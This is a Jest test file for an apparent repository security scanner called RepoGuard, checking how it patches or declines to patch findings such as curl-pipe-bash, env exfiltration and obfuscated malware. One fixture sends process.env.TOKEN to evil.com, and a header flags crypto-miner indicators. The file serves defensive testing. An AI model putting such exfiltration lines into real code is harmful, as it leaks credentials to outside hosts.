# ============================================================
# REPOGUARD — MANUAL REVIEW REQUIRED: tests/pullRequest.test.ts
# Scanned: 2026-06-14T19:49:19.800Z
# The following findings could NOT be automatically patched:
#   [HIGH] crypto-miner-keywords: Cryptocurrency miner indicators
# ============================================================

import { applyPatches, buildPRBody, openFixPR, closeRepoGuardPRsAndIssues } from "../src/pullRequest";
import type { Finding } from "../src/types";

describe("pullRequest", () => {
  describe("applyPatches", () => {
    it("patches curl-pipe-bash and returns it as a patched finding", () => {
      const original = "# REMOVED BY REPOGUARD: curl|bash remote execution";
      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];
      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.sh");
      expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash");
      expect(patchedFindings).toHaveLength(1);
      expect(patchedFindings[0].rule).toBe("curl-pipe-bash");
    });

    it("does not patch env-exfiltration and returns no patched findings", () => {
      const original = "const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);";
      const findings: Finding[] = [
        {
          rule: "env-exfiltration",
          severity: "high",
          message: "env exfiltration detected",
          file: "test.js",
        },
      ];
      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.js");
      expect(patchedContent).toBe(original);
      expect(patchedFindings).toHaveLength(0);
    });

    it("patches obfuscated-malware-pattern and comments out malware and createRequire bypasses", () => {
      const original = "// REMOVED BY REPOGUARD: createRequire import for malware\n// REMOVED BY REPOGUARD: require definition for malware\n
// REMOVED BY REPOGUARD: obfuscated malware payload
